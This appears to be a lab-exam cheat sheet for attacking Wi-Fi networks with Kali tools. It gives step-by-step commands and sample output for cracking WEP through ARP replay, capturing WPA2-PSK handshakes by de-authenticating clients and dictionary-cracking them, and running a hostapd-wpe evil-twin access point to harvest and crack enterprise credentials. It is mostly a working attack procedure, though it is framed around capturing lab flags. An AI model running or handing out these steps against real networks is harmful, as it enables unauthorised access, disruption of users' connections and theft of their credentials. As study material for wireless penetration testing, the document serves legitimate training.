## DO THIS FIRST - Enumeration
### 1. Ensure monitor mode
```
# change to user to root first
kali@kali:~$ sudo su

# iwconfig to list all the wireless devices on this computer
root@kali:~# iwconfig

# find the wireless interface and put it onto monitor mode
root@kali:~# airmon-ng start wlan0

# run iwconfig again to ensure the interface is in monitor mode. Note that the interface might change name so use the new name from here on
root@kali:~# iwconfig
```
### 2. Find APs
```
# scan the wifi activity using airodump-ng note down the ESSID, BSSID, Channel, Auth for targeted sniffing. 
root@kali:~# airodump-ng <interface_name>
e.g:
root@kali:~# airodump-ng wlan0mon

CH 128 ][ Elapsed: 42 s ][ 2024-11-11 15:13 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 F0:9F:C2:71:22:1A  -28       15        0    0  44   54e  WPA2 CCMP   MGT  wifi-corp         
 F0:9F:C2:7A:33:28  -28       15        0    0  44   54e  WPA2 CCMP   MGT  wifi-regional-tabl
 F0:9F:C2:71:22:15  -28       15        0    0  44   54e  WPA2 CCMP   MGT  wifi-corp

```
## CHOOSE FOR THE RESPECTIVE AUTHENTICATION METHODS
### 3a. If AUTH is *WEP*
#### Theory
```
- 24-bit IV
    - Susceptible to related-key attack
    - 50% probability that IV is reused after 5000 packets
- Eavesdropping enough packets of WEP handshake can crack the password
```
#### Method
```
# 1. Do targeted sniffing of the AP (that you are interested in) and write to a file.
- Note:
a. Can choose to use ESSID or BSSID.
b. Get the details of the station connected to the AP same as ESSID, BSSID, Channel
root@kali:~# airodump-ng <interface_name> --essid <ESSID> --channel <CHANNEL_NO > -w <FILENAME>

e.g:
root@kali:~# airodump-ng wlan0mon --essid wifi-old --channel 3 -w wep
​
# 2. Replay ARP requests in the network, using aireplay-ng in another terminal [Create another SSH session]
Note: Station is the BSSID of the station connected to the AP
root@kali:~# aireplay-ng -3 -b <AP_BSSID> -h <Station_BSSID> <Interface>

e.g.
root@kali:~# aireplay-ng -3 -b F0:9F:C2:71:22:11 -h 3A:2E:A2:2B:48:22 wlan0mon

# 3. At the folder where the command is run there is a .cap file. Crack the WEP handshake captured in the file
root@kali:~# aircrack-ng <File_Name> -w /usr/share/wordlists/rockyou.txt

e.g.
root@kali:~# aircrack-ng wep3-01.cap -w /usr/share/wordlists/rockyou.txt

# 4. Note down the wifi key - The key is the KEY FOUND! without : e.g 11BB33CD55
example output:
Attack will be restarted every 5000 captured ivs.
Starting PTW attack with 133975 ivs.
                         KEY FOUND! [ 11:BB:33:CD:55 ] 
	Decrypted correctly: 100%

# 5. Connect to the target:
a. Create the config file:

root@kali:~# nano wep.conf

network={
  ssid="wifi-old"        ##CHANGE THIS
  key_mgmt=NONE
  wep_key0=11BB33CD55    ##CHANGE THIS
  wep_tx_keyidx=0
}

b. Connect to the target using wpa_supplicant
root@kali:~# wpa_supplicant -D nl80211 -i wlan0mon -c wep.conf

c. Obtain IP on another terminal [Another SSH session]:

root@kali:~# dhclient wlan0mon -v
Internet Systems Consortium DHCP Client 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/

...
DHCPDISCOVER on wlan2 to 255.255.255.255 port 67 interval 8 (xid=0x9e96451)
DHCPOFFER of 192.168.1.84 from 192.168.1.1
DHCPREQUEST for 192.168.1.84 on wlan2 to 255.255.255.255 port 67 (xid=0x5164e909)
DHCPACK of 192.168.1.84 from 192.168.1.1 (xid=0x9e96451)
bound to 192.168.1.84 -- renewal in 41214 seconds.

d. Get the flag from 192.168.1.1
root@kali:~# curl http://192.168.1.1/proof.txt 

```
### 3b. If AUTH is *WPA2-PSK*
#### Theory
```
-4-way handshake
- Produces a challenge and a result, which can be used to deduce the key using offline brute-force/dictionary attacks even though the key is never transmitted
- Handshake is only performed at each re-connection of a client
```
#### Method
```
# 1. Do targeted sniffing of the AP (that you are interested in) and write to a file.
- Note:
a. Can choose to use ESSID or BSSID.
b. Get the details of the station connected to the AP same as ESSID, BSSID, Channel
root@kali:~# airodump-ng <interface_name> --essid <ESSID> --channel <CHANNEL_NO >-w <FILENAME>

e.g:
root@kali:~# airodump-ng wlan0mon --essid wifi-mobile --channel 6 -w psk
​
2. Perform de-authentication attack on connected clients, in another terminal [Another SSH session]
root@kali:~# aireplay-ng -0 1 -a <AP_BSSID> -c <STATION_BSSID> <Interface>
​
e.g.
root@kali:~# aireplay-ng -0 1 -a F0:9F:C2:71:22:12 -c 28:6C:07:6F:F9:43 wlan0mon

3. Ensure that the WPA handshake is captured on the airodump-ng terminal then stop. Crack the captured wireless traffic in the .cap file
root@kali:~# aircrack-ng <capture_file> -w <wordlist_file>

e.g. 
root@kali:~# aircrack-ng wpa-01.cap -w /usr/share/wordlists/rockyou.txt

4. Connect to the network using the cracked credentials:
a. Create the config file:

root@kali:~# nano psk.conf

network={
    ssid="wifi-mobile"  ##CHANGE THIS
    psk="starwars1"     ##CHANGE THIS
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}

b. Connect to the target using wpa_supplicant
root@kali:~# wpa_supplicant -D nl80211 -i wlan0mon -c psk.conf

c. Obtain IP on another terminal [Another SSH session]:

root@kali:~# dhclient wlan0mon -v
Internet Systems Consortium DHCP Client 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/

...
DHCPDISCOVER on wlan2 to 255.255.255.255 port 67 interval 8 (xid=0x9e96451)
DHCPOFFER of 192.168.1.84 from 192.168.1.1
DHCPREQUEST for 192.168.1.84 on wlan2 to 255.255.255.255 port 67 (xid=0x5164e909)
DHCPACK of 192.168.1.84 from 192.168.1.1 (xid=0x9e96451)
bound to 192.168.1.84 -- renewal in 41214 seconds.

d. Get the flag from 192.168.1.1
root@kali:~# curl http://192.168.1.1/proof.txt
```
### 3b. If AUTH is *WPA2-MGT*
#### Theory
```
- Client does not authenticate the AP, susceptible to Evil Twin AP
    - Client connects to evil twin AP and presents user authentication hash
    - authentication hash can be cracked using offline brute-force/dictionary attacks
```
#### Method
```
# 1. Do targeted sniffing of the AP (that you are interested in) and write to a file.
- Note:
a. Can choose to use ESSID or BSSID.
b. Get the details of the station connected to the AP same as ESSID, BSSID, Channel
root@kali:~# airodump-ng <interface_name> --essid <ESSID> --channel <CHANNEL_NO >-w <FILENAME>

e.g:
root@kali:~# airodump-ng wlan0mon --essid wifi-corp--channel 44 -w mgt
​
# 2. Stop the monitor mode of the network interface
root@kali:~# airmon-stop wlan0mon

# 3. Create a rogue AP using hostapd-wpe and capture the credentials.
a. Edit the Evil Twin AP config file accordingly
root@kali:~# sudo nano /etc/hostapd-wpe/hostapd-wpe.conf

# Configuration file for hostapd-wpe

interface=wlan0             ##CHANGE THIS IF NOT THE SAME AS YOUR NETWORK INTERFACE NAME

# May have to change these depending on build location
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh

# 802.11 Options
ssid=CHANGE_ME   		##CHANGE THIS
channel=CHANGE_ME		##CHANGE THIS
bssid=CHANGE_ME			##CHANGE THIS IF THERE IS A BSSID Option else don't need

b. run the Rogue AP
root@kali:~# hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

c. Leave it running and after awhile there will be some station connected to it.
Note the Username (MUST HAVE DOMAIN), challenge and response and the jtr hash.

d. <Option 1> Crack the credentials using asleap.
root@kali:~# asleap -C <CHALLENGE> -R <RESPONSE> -W <wordlist>

e.g.
root@kali:~# asleap -C 07:86:ae:a0:21:5b:c3:0a -R 7f:6a:14:f1:1e:eb:98:0f:da:11:bf:83:a1:42:a8:74:4f:00:68:3a:d5:bc:5c:b6 -W /usr/share/wordlists/rockyou.txt

<Option 2> Create the credentials using JTR (John the Ripper)
d1. Obtain the JTR hash from the output and echo into file
echo 'user:hash' > hash.txt
#IMPORTANT: use single inverted commas to prevent $ escape

d2. Crack the hash with JTR
john -w /usr/share/wordlists/rockyou.txt --format=netntlm hash.txt
 
4. Connect to the network using the cracked credentials:
a. Create the config file:

root@kali:~# nano mgt.conf
network={
            ssid="ESSID"                             ##CHANGE THIS
            scan_ssid=1
            key_mgmt=WPA-EAP
            identity="DOMAIN\USERNAME"               ##CHANGE THIS
            password="PASSWORD"                      ##CHANGE THIS
            phase1="peaplabel=0"
            phase2="auth=MSCHAPV2"
    }

b. Connect to the target using wpa_supplicant
root@kali:~# wpa_supplicant -D nl80211 -i wlan0mon -c mgt.conf

c. Obtain IP on another terminal [Another SSH session]:

root@kali:~# dhclient wlan0mon -v
Internet Systems Consortium DHCP Client 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/

...
DHCPDISCOVER on wlan2 to 255.255.255.255 port 67 interval 8 (xid=0x9e96451)
DHCPOFFER of 192.168.1.84 from 192.168.1.1
DHCPREQUEST for 192.168.1.84 on wlan2 to 255.255.255.255 port 67 (xid=0x5164e909)
DHCPACK of 192.168.1.84 from 192.168.1.1 (xid=0x9e96451)
bound to 192.168.1.84 -- renewal in 41214 seconds.

d. Get the flag from 192.168.1.1
root@kali:~# curl http://192.168.1.1/proof.txt
```

## Additional pointers
```
1. If the wordlist is zipped, do remember to unzip it.
root@kali:~# gzip -d /usr/share/wordlists/rockyou.txt.gz
```

